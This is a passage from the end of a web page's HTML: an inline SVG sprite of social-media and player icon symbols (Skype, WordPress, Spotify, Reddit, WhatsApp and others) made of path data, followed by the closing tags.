6.884t-4.991 4.991-6.884 1.839-6.884-1.839-4.991-4.991-1.839-6.884 1.839-6.884 4.991-4.991 6.884-1.839 6.884 1.839 4.991 4.991 1.839 6.884z"></path>
</symbol>
<symbol id="icon-skype" viewBox="0 0 27 32">
<path class="path1" d="M20.946 18.982q0-0.893-0.348-1.634t-0.866-1.223-1.304-0.875-1.473-0.607-1.563-0.411l-1.857-0.429q-0.536-0.125-0.786-0.188t-0.625-0.205-0.536-0.286-0.295-0.375-0.134-0.536q0-1.375 2.571-1.375 0.768 0 1.375 0.214t0.964 0.509 0.679 0.598 0.714 0.518 0.857 0.214q0.839 0 1.348-0.571t0.509-1.375q0-0.982-1-1.777t-2.536-1.205-3.25-0.411q-1.214 0-2.357 0.277t-2.134 0.839-1.589 1.554-0.598 2.295q0 1.089 0.339 1.902t1 1.348 1.429 0.866 1.839 0.58l2.607 0.643q1.607 0.393 2 0.643 0.571 0.357 0.571 1.071 0 0.696-0.714 1.152t-1.875 0.455q-0.911 0-1.634-0.286t-1.161-0.688-0.813-0.804-0.821-0.688-0.964-0.286q-0.893 0-1.348 0.536t-0.455 1.339q0 1.643 2.179 2.813t5.196 1.17q1.304 0 2.5-0.33t2.188-0.955 1.58-1.67 0.589-2.348zM27.429 22.857q0 2.839-2.009 4.848t-4.848 2.009q-2.321 0-4.179-1.429-1.375 0.286-2.679 0.286-2.554 0-4.884-0.991t-4.018-2.679-2.679-4.018-0.991-4.884q0-1.304 0.286-2.679-1.429-1.857-1.429-4.179 0-2.839 2.009-4.848t4.848-2.009q2.321 0 4.179 1.429 1.375-0.286 2.679-0.286 2.554 0 4.884 0.991t4.018 2.679 2.679 4.018 0.991 4.884q0 1.304-0.286 2.679 1.429 1.857 1.429 4.179z"></path>
</symbol>
<symbol id="icon-foursquare" viewBox="0 0 23 32">
<path class="path1" d="M17.857 7.75l0.661-3.464q0.089-0.411-0.161-0.714t-0.625-0.304h-12.714q-0.411 0-0.688 0.304t-0.277 0.661v19.661q0 0.125 0.107 0.018l5.196-6.286q0.411-0.464 0.679-0.598t0.857-0.134h4.268q0.393 0 0.661-0.259t0.321-0.527q0.429-2.321 0.661-3.411 0.071-0.375-0.205-0.714t-0.652-0.339h-5.25q-0.518 0-0.857-0.339t-0.339-0.857v-0.75q0-0.518 0.339-0.848t0.857-0.33h6.179q0.321 0 0.625-0.241t0.357-0.527zM21.911 3.786q-0.268 1.304-0.955 4.759t-1.241 6.25-0.625 3.098q-0.107 0.393-0.161 0.58t-0.25 0.58-0.438 0.589-0.688 0.375-1.036 0.179h-4.839q-0.232 0-0.393 0.179-0.143 0.161-7.607 8.821-0.393 0.446-1.045 0.509t-0.866-0.098q-0.982-0.393-0.982-1.75v-25.179q0-0.982 0.679-1.83t2.143-0.848h15.857q1.696 0 2.268 0.946t0.179 2.839zM21.911 3.786l-2.821 14.107q0.071-0.304 0.625-3.098t1.241-6.25 0.955-4.759z"></path>
</symbol>
<symbol id="icon-wordpress" viewBox="0 0 32 32">
<path class="path1" d="M2.268 16q0-2.911 1.196-5.589l6.554 17.946q-3.5-1.696-5.625-5.018t-2.125-7.339zM25.268 15.304q0 0.339-0.045 0.688t-0.179 0.884-0.205 0.786-0.313 1.054-0.313 1.036l-1.357 4.571-4.964-14.75q0.821-0.054 1.571-0.143 0.339-0.036 0.464-0.33t-0.045-0.554-0.509-0.241l-3.661 0.179q-1.339-0.018-3.607-0.179-0.214-0.018-0.366 0.089t-0.205 0.268-0.027 0.33 0.161 0.295 0.348 0.143l1.429 0.143 2.143 5.857-3 9-5-14.857q0.821-0.054 1.571-0.143 0.339-0.036 0.464-0.33t-0.045-0.554-0.509-0.241l-3.661 0.179q-0.125 0-0.411-0.009t-0.464-0.009q1.875-2.857 4.902-4.527t6.563-1.67q2.625 0 5.009 0.946t4.259 2.661h-0.179q-0.982 0-1.643 0.723t-0.661 1.705q0 0.214 0.036 0.429t0.071 0.384 0.143 0.411 0.161 0.375 0.214 0.402 0.223 0.375 0.259 0.429 0.25 0.411q1.125 1.911 1.125 3.786zM16.232 17.196l4.232 11.554q0.018 0.107 0.089 0.196-2.25 0.786-4.554 0.786-2 0-3.875-0.571zM28.036 9.411q1.696 3.107 1.696 6.589 0 3.732-1.857 6.884t-4.982 4.973l4.196-12.107q1.054-3.018 1.054-4.929 0-0.75-0.107-1.411zM16 0q3.25 0 6.214 1.268t5.107 3.411 3.411 5.107 1.268 6.214-1.268 6.214-3.411 5.107-5.107 3.411-6.214 1.268-6.214-1.268-5.107-3.411-3.411-5.107-1.268-6.214 1.268-6.214 3.411-5.107 5.107-3.411 6.214-1.268zM16 31.268q3.089 0 5.92-1.214t4.875-3.259 3.259-4.875 1.214-5.92-1.214-5.92-3.259-4.875-4.875-3.259-5.92-1.214-5.92 1.214-4.875 3.259-3.259 4.875-1.214 5.92 1.214 5.92 3.259 4.875 4.875 3.259 5.92 1.214z"></path>
</symbol>
<symbol id="icon-stumbleupon" viewBox="0 0 34 32">
<path class="path1" d="M18.964 12.714v-2.107q0-0.75-0.536-1.286t-1.286-0.536-1.286 0.536-0.536 1.286v10.929q0 3.125-2.25 5.339t-5.411 2.214q-3.179 0-5.42-2.241t-2.241-5.42v-4.75h5.857v4.679q0 0.768 0.536 1.295t1.286 0.527 1.286-0.527 0.536-1.295v-11.071q0-3.054 2.259-5.214t5.384-2.161q3.143 0 5.393 2.179t2.25 5.25v2.429l-3.482 1.036zM28.429 16.679h5.857v4.75q0 3.179-2.241 5.42t-5.42 2.241q-3.161 0-5.411-2.223t-2.25-5.366v-4.786l2.339 1.089 3.482-1.036v4.821q0 0.75 0.536 1.277t1.286 0.527 1.286-0.527 0.536-1.277v-4.911z"></path>
</symbol>
<symbol id="icon-digg" viewBox="0 0 37 32">
<path class="path1" d="M5.857 5.036h3.643v17.554h-9.5v-12.446h5.857v-5.107zM5.857 19.661v-6.589h-2.196v6.589h2.196zM10.964 10.143v12.446h3.661v-12.446h-3.661zM10.964 5.036v3.643h3.661v-3.643h-3.661zM16.089 10.143h9.518v16.821h-9.518v-2.911h5.857v-1.464h-5.857v-12.446zM21.946 19.661v-6.589h-2.196v6.589h2.196zM27.071 10.143h9.5v16.821h-9.5v-2.911h5.839v-1.464h-5.839v-12.446zM32.911 19.661v-6.589h-2.196v6.589h2.196z"></path>
</symbol>
<symbol id="icon-spotify" viewBox="0 0 27 32">
<path class="path1" d="M20.125 21.607q0-0.571-0.536-0.911-3.446-2.054-7.982-2.054-2.375 0-5.125 0.607-0.75 0.161-0.75 0.929 0 0.357 0.241 0.616t0.634 0.259q0.089 0 0.661-0.143 2.357-0.482 4.339-0.482 4.036 0 7.089 1.839 0.339 0.196 0.589 0.196 0.339 0 0.589-0.241t0.25-0.616zM21.839 17.768q0-0.714-0.625-1.089-4.232-2.518-9.786-2.518-2.732 0-5.411 0.75-0.857 0.232-0.857 1.143 0 0.446 0.313 0.759t0.759 0.313q0.125 0 0.661-0.143 2.179-0.589 4.482-0.589 4.982 0 8.714 2.214 0.429 0.232 0.679 0.232 0.446 0 0.759-0.313t0.313-0.759zM23.768 13.339q0-0.839-0.714-1.25-2.25-1.304-5.232-1.973t-6.125-0.67q-3.643 0-6.5 0.839-0.411 0.125-0.688 0.455t-0.277 0.866q0 0.554 0.366 0.929t0.92 0.375q0.196 0 0.714-0.143 2.375-0.661 5.482-0.661 2.839 0 5.527 0.607t4.527 1.696q0.375 0.214 0.714 0.214 0.518 0 0.902-0.366t0.384-0.92zM27.429 16q0 3.732-1.839 6.884t-4.991 4.991-6.884 1.839-6.884-1.839-4.991-4.991-1.839-6.884 1.839-6.884 4.991-4.991 6.884-1.839 6.884 1.839 4.991 4.991 1.839 6.884z"></path>
</symbol>
<symbol id="icon-soundcloud" viewBox="0 0 41 32">
<path class="path1" d="M14 24.5l0.286-4.304-0.286-9.339q-0.018-0.179-0.134-0.304t-0.295-0.125q-0.161 0-0.286 0.125t-0.125 0.304l-0.25 9.339 0.25 4.304q0.018 0.179 0.134 0.295t0.277 0.116q0.393 0 0.429-0.411zM19.286 23.982l0.196-3.768-0.214-10.464q0-0.286-0.232-0.429-0.143-0.089-0.286-0.089t-0.286 0.089q-0.232 0.143-0.232 0.429l-0.018 0.107-0.179 10.339q0 0.018 0.196 4.214v0.018q0 0.179 0.107 0.304 0.161 0.196 0.411 0.196 0.196 0 0.357-0.161 0.161-0.125 0.161-0.357zM0.625 17.911l0.357 2.286-0.357 2.25q-0.036 0.161-0.161 0.161t-0.161-0.161l-0.304-2.25 0.304-2.286q0.036-0.161 0.161-0.161t0.161 0.161zM2.161 16.5l0.464 3.696-0.464 3.625q-0.036 0.161-0.179 0.161-0.161 0-0.161-0.179l-0.411-3.607 0.411-3.696q0-0.161 0.161-0.161 0.143 0 0.179 0.161zM3.804 15.821l0.446 4.375-0.446 4.232q0 0.196-0.196 0.196-0.179 0-0.214-0.196l-0.375-4.232 0.375-4.375q0.036-0.214 0.214-0.214 0.196 0 0.196 0.214zM5.482 15.696l0.411 4.5-0.411 4.357q-0.036 0.232-0.25 0.232-0.232 0-0.232-0.232l-0.375-4.357 0.375-4.5q0-0.232 0.232-0.232 0.214 0 0.25 0.232zM7.161 16.018l0.375 4.179-0.375 4.393q-0.036 0.286-0.286 0.286-0.107 0-0.188-0.080t-0.080-0.205l-0.357-4.393 0.357-4.179q0-0.107 0.080-0.188t0.188-0.080q0.25 0 0.286 0.268zM8.839 13.411l0.375 6.786-0.375 4.393q0 0.125-0.089 0.223t-0.214 0.098q-0.286 0-0.321-0.321l-0.321-4.393 0.321-6.786q0.036-0.321 0.321-0.321 0.125 0 0.214 0.098t0.089 0.223zM10.518 11.875l0.339 8.357-0.339 4.357q0 0.143-0.098 0.241t-0.241 0.098q-0.321 0-0.357-0.339l-0.286-4.357 0.286-8.357q0.036-0.339 0.357-0.339 0.143 0 0.241 0.098t0.098 0.241zM12.268 11.161l0.321 9.036-0.321 4.321q-0.036 0.375-0.393 0.375-0.339 0-0.375-0.375l-0.286-4.321 0.286-9.036q0-0.161 0.116-0.277t0.259-0.116q0.161 0 0.268 0.116t0.125 0.277zM19.268 24.411v0 0zM15.732 11.089l0.268 9.107-0.268 4.268q0 0.179-0.134 0.313t-0.313 0.134-0.304-0.125-0.143-0.321l-0.25-4.268 0.25-9.107q0-0.196 0.134-0.321t0.313-0.125 0.313 0.125 0.134 0.321zM17.5 11.429l0.25 8.786-0.25 4.214q0 0.196-0.143 0.339t-0.339 0.143-0.339-0.143-0.161-0.339l-0.214-4.214 0.214-8.786q0.018-0.214 0.161-0.357t0.339-0.143 0.33 0.143 0.152 0.357zM21.286 20.214l-0.25 4.125q0 0.232-0.161 0.393t-0.393 0.161-0.393-0.161-0.179-0.393l-0.107-2.036-0.107-2.089 0.214-11.357v-0.054q0.036-0.268 0.214-0.429 0.161-0.125 0.357-0.125 0.143 0 0.268 0.089 0.25 0.143 0.286 0.464zM41.143 19.875q0 2.089-1.482 3.563t-3.571 1.473h-14.036q-0.232-0.036-0.393-0.196t-0.161-0.393v-16.054q0-0.411 0.5-0.589 1.518-0.607 3.232-0.607 3.482 0 6.036 2.348t2.857 5.777q0.946-0.393 1.964-0.393 2.089 0 3.571 1.482t1.482 3.589z"></path>
</symbol>
<symbol id="icon-codepen" viewBox="0 0 32 32">
<path class="path1" d="M3.857 20.875l10.768 7.179v-6.411l-5.964-3.982zM2.75 18.304l3.446-2.304-3.446-2.304v4.607zM17.375 28.054l10.768-7.179-4.804-3.214-5.964 3.982v6.411zM16 19.25l4.857-3.25-4.857-3.25-4.857 3.25zM8.661 14.339l5.964-3.982v-6.411l-10.768 7.179zM25.804 16l3.446 2.304v-4.607zM23.339 14.339l4.804-3.214-10.768-7.179v6.411zM32 11.125v9.75q0 0.732-0.607 1.143l-14.625 9.75q-0.375 0.232-0.768 0.232t-0.768-0.232l-14.625-9.75q-0.607-0.411-0.607-1.143v-9.75q0-0.732 0.607-1.143l14.625-9.75q0.375-0.232 0.768-0.232t0.768 0.232l14.625 9.75q0.607 0.411 0.607 1.143z"></path>
</symbol>
<symbol id="icon-twitch" viewBox="0 0 32 32">
<path class="path1" d="M16 7.75v7.75h-2.589v-7.75h2.589zM23.107 7.75v7.75h-2.589v-7.75h2.589zM23.107 21.321l4.518-4.536v-14.196h-21.321v18.732h5.821v3.875l3.875-3.875h7.107zM30.214 0v18.089l-7.75 7.75h-5.821l-3.875 3.875h-3.875v-3.875h-7.107v-20.679l1.946-5.161h26.482z"></path>
</symbol>
<symbol id="icon-meanpath" viewBox="0 0 27 32">
<path class="path1" d="M23.411 15.036v2.036q0 0.429-0.241 0.679t-0.67 0.25h-3.607q-0.429 0-0.679-0.25t-0.25-0.679v-2.036q0-0.429 0.25-0.679t0.679-0.25h3.607q0.429 0 0.67 0.25t0.241 0.679zM14.661 19.143v-4.464q0-0.946-0.58-1.527t-1.527-0.58h-2.375q-1.214 0-1.714 0.929-0.5-0.929-1.714-0.929h-2.321q-0.946 0-1.527 0.58t-0.58 1.527v4.464q0 0.393 0.375 0.393h0.982q0.393 0 0.393-0.393v-4.107q0-0.429 0.241-0.679t0.688-0.25h1.679q0.429 0 0.679 0.25t0.25 0.679v4.107q0 0.393 0.375 0.393h0.964q0.393 0 0.393-0.393v-4.107q0-0.429 0.25-0.679t0.679-0.25h1.732q0.429 0 0.67 0.25t0.241 0.679v4.107q0 0.393 0.393 0.393h0.982q0.375 0 0.375-0.393zM25.179 17.429v-2.75q0-0.946-0.589-1.527t-1.536-0.58h-4.714q-0.946 0-1.536 0.58t-0.589 1.527v7.321q0 0.375 0.393 0.375h0.982q0.375 0 0.375-0.375v-3.214q0.554 0.75 1.679 0.75h3.411q0.946 0 1.536-0.58t0.589-1.527zM27.429 6.429v19.143q0 1.714-1.214 2.929t-2.929 1.214h-19.143q-1.714 0-2.929-1.214t-1.214-2.929v-19.143q0-1.714 1.214-2.929t2.929-1.214h19.143q1.714 0 2.929 1.214t1.214 2.929z"></path>
</symbol>
<symbol id="icon-pinterest-p" viewBox="0 0 23 32">
<path class="path1" d="M0 10.661q0-1.929 0.67-3.634t1.848-2.973 2.714-2.196 3.304-1.393 3.607-0.464q2.821 0 5.25 1.188t3.946 3.455 1.518 5.125q0 1.714-0.339 3.357t-1.071 3.161-1.786 2.67-2.589 1.839-3.375 0.688q-1.214 0-2.411-0.571t-1.714-1.571q-0.179 0.696-0.5 2.009t-0.42 1.696-0.366 1.268-0.464 1.268-0.571 1.116-0.821 1.384-1.107 1.545l-0.25 0.089-0.161-0.179q-0.268-2.804-0.268-3.357 0-1.643 0.384-3.688t1.188-5.134 0.929-3.625q-0.571-1.161-0.571-3.018 0-1.482 0.929-2.786t2.357-1.304q1.089 0 1.696 0.723t0.607 1.83q0 1.179-0.786 3.411t-0.786 3.339q0 1.125 0.804 1.866t1.946 0.741q0.982 0 1.821-0.446t1.402-1.214 1-1.696 0.679-1.973 0.357-1.982 0.116-1.777q0-3.089-1.955-4.813t-5.098-1.723q-3.571 0-5.964 2.313t-2.393 5.866q0 0.786 0.223 1.518t0.482 1.161 0.482 0.813 0.223 0.545q0 0.5-0.268 1.304t-0.661 0.804q-0.036 0-0.304-0.054-0.911-0.268-1.616-1t-1.089-1.688-0.58-1.929-0.196-1.902z"></path>
</symbol>
<symbol id="icon-periscope" viewBox="0 0 24 28">
<path class="path1" d="M12.285,1C6.696,1,2.277,5.643,2.277,11.243c0,5.851,7.77,14.578,10.007,14.578c1.959,0,9.729-8.728,9.729-14.578 C22.015,5.643,17.596,1,12.285,1z M12.317,16.551c-3.473,0-6.152-2.611-6.152-5.664c0-1.292,0.39-2.472,1.065-3.438 c0.206,1.084,1.18,1.906,2.352,1.906c1.322,0,2.393-1.043,2.393-2.333c0-0.832-0.447-1.561-1.119-1.975 c0.467-0.105,0.955-0.161,1.46-0.161c3.133,0,5.81,2.611,5.81,5.998C18.126,13.94,15.449,16.551,12.317,16.551z"></path>
</symbol>
<symbol id="icon-get-pocket" viewBox="0 0 31 32">
<path class="path1" d="M27.946 2.286q1.161 0 1.964 0.813t0.804 1.973v9.268q0 3.143-1.214 6t-3.259 4.911-4.893 3.259-5.973 1.205q-3.143 0-5.991-1.205t-4.902-3.259-3.268-4.911-1.214-6v-9.268q0-1.143 0.821-1.964t1.964-0.821h25.161zM15.375 21.286q0.839 0 1.464-0.589l7.214-6.929q0.661-0.625 0.661-1.518 0-0.875-0.616-1.491t-1.491-0.616q-0.839 0-1.464 0.589l-5.768 5.536-5.768-5.536q-0.625-0.589-1.446-0.589-0.875 0-1.491 0.616t-0.616 1.491q0 0.911 0.643 1.518l7.232 6.929q0.589 0.589 1.446 0.589z"></path>
</symbol>
<symbol id="icon-vimeo" viewBox="0 0 32 32">
<path class="path1" d="M30.518 9.25q-0.179 4.214-5.929 11.625-5.946 7.696-10.036 7.696-2.536 0-4.286-4.696-0.786-2.857-2.357-8.607-1.286-4.679-2.804-4.679-0.321 0-2.268 1.357l-1.375-1.75q0.429-0.375 1.929-1.723t2.321-2.063q2.786-2.464 4.304-2.607 1.696-0.161 2.732 0.991t1.446 3.634q0.786 5.125 1.179 6.661 0.982 4.446 2.143 4.446 0.911 0 2.75-2.875 1.804-2.875 1.946-4.393 0.232-2.482-1.946-2.482-1.018 0-2.161 0.464 2.143-7.018 8.196-6.821 4.482 0.143 4.214 5.821z"></path>
</symbol>
<symbol id="icon-reddit-alien" viewBox="0 0 32 32">
<path class="path1" d="M32 15.107q0 1.036-0.527 1.884t-1.42 1.295q0.214 0.821 0.214 1.714 0 2.768-1.902 5.125t-5.188 3.723-7.143 1.366-7.134-1.366-5.179-3.723-1.902-5.125q0-0.839 0.196-1.679-0.911-0.446-1.464-1.313t-0.554-1.902q0-1.464 1.036-2.509t2.518-1.045q1.518 0 2.589 1.125 3.893-2.714 9.196-2.893l2.071-9.304q0.054-0.232 0.268-0.375t0.464-0.089l6.589 1.446q0.321-0.661 0.964-1.063t1.411-0.402q1.107 0 1.893 0.777t0.786 1.884-0.786 1.893-1.893 0.786-1.884-0.777-0.777-1.884l-5.964-1.321-1.857 8.429q5.357 0.161 9.268 2.857 1.036-1.089 2.554-1.089 1.482 0 2.518 1.045t1.036 2.509zM7.464 18.661q0 1.107 0.777 1.893t1.884 0.786 1.893-0.786 0.786-1.893-0.786-1.884-1.893-0.777q-1.089 0-1.875 0.786t-0.786 1.875zM21.929 25q0.196-0.196 0.196-0.464t-0.196-0.464q-0.179-0.179-0.446-0.179t-0.464 0.179q-0.732 0.75-2.161 1.107t-2.857 0.357-2.857-0.357-2.161-1.107q-0.196-0.179-0.464-0.179t-0.446 0.179q-0.196 0.179-0.196 0.455t0.196 0.473q0.768 0.768 2.116 1.214t2.188 0.527 1.625 0.080 1.625-0.080 2.188-0.527 2.116-1.214zM21.875 21.339q1.107 0 1.884-0.786t0.777-1.893q0-1.089-0.786-1.875t-1.875-0.786q-1.107 0-1.893 0.777t-0.786 1.884 0.786 1.893 1.893 0.786z"></path>
</symbol>
<symbol id="icon-whatsapp" viewBox="0 0 32 32">
<path d="M15.968 2.003a14.03 13.978 0 0 0-14.03 13.978 14.03 13.978 0 0 0 2.132 7.391L1.938 29.96l6.745-2.052a14.03 13.978 0 0 0 7.285 2.052 14.03 13.978 0 0 0 14.03-13.978 14.03 13.978 0 0 0-14.03-13.978z" stroke-width=".2000562"/>
<path d="M10.454 8.236a2.57 3.401 51.533 0 0-1.475 3.184v.015c.01 2.04 4.045 10.076 10.017 12.688l.017-.013a2.57 3.401 51.533 0 0 3.454-.706 2.57 3.401 51.533 0 0 1.064-4.129 2.57 3.401 51.533 0 0-4.262.103 2.57 3.401 51.533 0 0-.505.473c-1.346-.639-2.952-1.463-4.168-2.98-.771-.962-1.257-2.732-1.549-4.206a2.57 3.401 51.533 0 0 .605-.403 2.57 3.401 51.533 0 0 1.064-4.129 2.57 3.401 51.533 0 0-4.262.103z" stroke-width=".372"/>
</symbol>
<symbol id="icon-telegram" viewBox="0 0 32 32">
<path d="M30.8,2.2L0.6,13.9c-0.8,0.3-0.7,1.3,0,1.6l7.4,2.8l2.9,9.2c0.2,0.6,0.9,0.8,1.4,0.4l4.1-3.4 c0.4-0.4,1-0.4,1.5,0l7.4,5.4c0.5,0.4,1.2,0.1,1.4-0.5L32,3.2C32.1,2.5,31.4,1.9,30.8,2.2z M25,8.3l-11.9,11 c-0.4,0.4-0.7,0.9-0.8,1.5l-0.4,3c-0.1,0.4-0.6,0.4-0.7,0.1l-1.6-5.5c-0.2-0.6,0.1-1.3,0.6-1.6l14.4-8.9C25,7.7,25.3,8.1,25,8.3z"/>
</symbol>
<symbol id="icon-hashtag" viewBox="0 0 32 32">
<path class="path1" d="M17.696 18.286l1.143-4.571h-4.536l-1.143 4.571h4.536zM31.411 9.286l-1 4q-0.125 0.429-0.554 0.429h-5.839l-1.143 4.571h5.554q0.268 0 0.446 0.214 0.179 0.25 0.107 0.5l-1 4q-0.089 0.429-0.554 0.429h-5.839l-1.446 5.857q-0.125 0.429-0.554 0.429h-4q-0.286 0-0.464-0.214-0.161-0.214-0.107-0.5l1.393-5.571h-4.536l-1.446 5.857q-0.125 0.429-0.554 0.429h-4.018q-0.268 0-0.446-0.214-0.161-0.214-0.107-0.5l1.393-5.571h-5.554q-0.268 0-0.446-0.214-0.161-0.214-0.107-0.5l1-4q0.125-0.429 0.554-0.429h5.839l1.143-4.571h-5.554q-0.268 0-0.446-0.214-0.179-0.25-0.107-0.5l1-4q0.089-0.429 0.554-0.429h5.839l1.446-5.857q0.125-0.429 0.571-0.429h4q0.268 0 0.446 0.214 0.161 0.214 0.107 0.5l-1.393 5.571h4.536l1.446-5.857q0.125-0.429 0.571-0.429h4q0.268 0 0.446 0.214 0.161 0.214 0.107 0.5l-1.393 5.571h5.554q0.268 0 0.446 0.214 0.161 0.214 0.107 0.5z"></path>
</symbol>
<symbol id="icon-chain" viewBox="0 0 30 32">
<path class="path1" d="M26 21.714q0-0.714-0.5-1.214l-3.714-3.714q-0.5-0.5-1.214-0.5-0.75 0-1.286 0.571 0.054 0.054 0.339 0.33t0.384 0.384 0.268 0.339 0.232 0.455 0.063 0.491q0 0.714-0.5 1.214t-1.214 0.5q-0.268 0-0.491-0.063t-0.455-0.232-0.339-0.268-0.384-0.384-0.33-0.339q-0.589 0.554-0.589 1.304 0 0.714 0.5 1.214l3.679 3.696q0.482 0.482 1.214 0.482 0.714 0 1.214-0.464l2.625-2.607q0.5-0.5 0.5-1.196zM13.446 9.125q0-0.714-0.5-1.214l-3.679-3.696q-0.5-0.5-1.214-0.5-0.696 0-1.214 0.482l-2.625 2.607q-0.5 0.5-0.5 1.196 0 0.714 0.5 1.214l3.714 3.714q0.482 0.482 1.214 0.482 0.75 0 1.286-0.554-0.054-0.054-0.339-0.33t-0.384-0.384-0.268-0.339-0.232-0.455-0.063-0.491q0-0.714 0.5-1.214t1.214-0.5q0.268 0 0.491 0.063t0.455 0.232 0.339 0.268 0.384 0.384 0.33 0.339q0.589-0.554 0.589-1.304zM29.429 21.714q0 2.143-1.518 3.625l-2.625 2.607q-1.482 1.482-3.625 1.482-2.161 0-3.643-1.518l-3.679-3.696q-1.482-1.482-1.482-3.625 0-2.196 1.571-3.732l-1.571-1.571q-1.536 1.571-3.714 1.571-2.143 0-3.643-1.5l-3.714-3.714q-1.5-1.5-1.5-3.643t1.518-3.625l2.625-2.607q1.482-1.482 3.625-1.482 2.161 0 3.643 1.518l3.679 3.696q1.482 1.482 1.482 3.625 0 2.196-1.571 3.732l1.571 1.571q1.536-1.571 3.714-1.571 2.143 0 3.643 1.5l3.714 3.714q1.5 1.5 1.5 3.643z"></path>
</symbol>
<symbol id="icon-thumb-tack" viewBox="0 0 21 32">
<path class="path1" d="M8.571 15.429v-8q0-0.25-0.161-0.411t-0.411-0.161-0.411 0.161-0.161 0.411v8q0 0.25 0.161 0.411t0.411 0.161 0.411-0.161 0.161-0.411zM20.571 21.714q0 0.464-0.339 0.804t-0.804 0.339h-7.661l-0.911 8.625q-0.036 0.214-0.188 0.366t-0.366 0.152h-0.018q-0.482 0-0.571-0.482l-1.357-8.661h-7.214q-0.464 0-0.804-0.339t-0.339-0.804q0-2.196 1.402-3.955t3.17-1.759v-9.143q-0.929 0-1.607-0.679t-0.679-1.607 0.679-1.607 1.607-0.679h11.429q0.929 0 1.607 0.679t0.679 1.607-0.679 1.607-1.607 0.679v9.143q1.768 0 3.17 1.759t1.402 3.955z"></path>
</symbol>
<symbol id="icon-arrow-left" viewBox="0 0 43 32">
<path class="path1" d="M42.311 14.044c-0.178-0.178-0.533-0.356-0.711-0.356h-33.778l10.311-10.489c0.178-0.178 0.356-0.533 0.356-0.711 0-0.356-0.178-0.533-0.356-0.711l-1.6-1.422c-0.356-0.178-0.533-0.356-0.889-0.356s-0.533 0.178-0.711 0.356l-14.578 14.933c-0.178 0.178-0.356 0.533-0.356 0.711s0.178 0.533 0.356 0.711l14.756 14.933c0 0.178 0.356 0.356 0.533 0.356s0.533-0.178 0.711-0.356l1.6-1.6c0.178-0.178 0.356-0.533 0.356-0.711s-0.178-0.533-0.356-0.711l-10.311-10.489h33.778c0.178 0 0.533-0.178 0.711-0.356 0.356-0.178 0.533-0.356 0.533-0.711v-2.133c0-0.356-0.178-0.711-0.356-0.889z"></path>
</symbol>
<symbol id="icon-arrow-right" viewBox="0 0 43 32">
<path class="path1" d="M0.356 17.956c0.178 0.178 0.533 0.356 0.711 0.356h33.778l-10.311 10.489c-0.178 0.178-0.356 0.533-0.356 0.711 0 0.356 0.178 0.533 0.356 0.711l1.6 1.6c0.178 0.178 0.533 0.356 0.711 0.356s0.533-0.178 0.711-0.356l14.756-14.933c0.178-0.356 0.356-0.711 0.356-0.889s-0.178-0.533-0.356-0.711l-14.756-14.933c0-0.178-0.356-0.356-0.533-0.356s-0.533 0.178-0.711 0.356l-1.6 1.6c-0.178 0.178-0.356 0.533-0.356 0.711s0.178 0.533 0.356 0.711l10.311 10.489h-33.778c-0.178 0-0.533 0.178-0.711 0.356-0.356 0.178-0.533 0.356-0.533 0.711v2.311c0 0.178 0.178 0.533 0.356 0.711z"></path>
</symbol>
<symbol id="icon-play" viewBox="0 0 22 28">
<path d="M21.625 14.484l-20.75 11.531c-0.484 0.266-0.875 0.031-0.875-0.516v-23c0-0.547 0.391-0.781 0.875-0.516l20.75 11.531c0.484 0.266 0.484 0.703 0 0.969z"></path>
</symbol>
<symbol id="icon-pause" viewBox="0 0 24 28">
<path d="M24 3v22c0 0.547-0.453 1-1 1h-8c-0.547 0-1-0.453-1-1v-22c0-0.547 0.453-1 1-1h8c0.547 0 1 0.453 1 1zM10 3v22c0 0.547-0.453 1-1 1h-8c-0.547 0-1-0.453-1-1v-22c0-0.547 0.453-1 1-1h8c0.547 0 1 0.453 1 1z"></path>
</symbol>
</defs>
</svg>

</body>
</html>
